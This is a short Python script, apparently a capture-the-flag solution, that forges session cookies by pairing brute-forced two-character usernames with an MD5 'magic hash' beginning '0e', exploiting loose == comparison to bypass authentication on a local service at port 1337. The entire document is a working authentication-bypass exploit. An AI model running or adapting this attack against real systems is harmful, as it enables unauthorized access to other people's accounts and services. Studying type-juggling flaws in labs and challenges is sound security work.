import requests
import string

def try_magic_hash_attack(url):
    # A known MD5 magic hash that equals 0 when compared with ==
    magic_signature = "0e462097431906509019562988736854"

    allowed_chars = string.ascii_lowercase + string.digits

    # Try different 2-byte usernames
    for char_one in allowed_chars:
        for char_two in allowed_chars:
            # Construct the username
            username = char_one + char_two
            cookie_value = username + magic_signature
            
            # Send request with our crafted cookie
            cookies = {'session': cookie_value}
            response = requests.get(url, cookies=cookies)
            
            # Check success
            if "Chucky" in response.text:
                print(response.text)
                print(f"Possible success with username: {username}")
                print(f"Cookie value: {cookie_value}")
                break

url = "http://localhost:1337/"
try_magic_hash_attack(url)
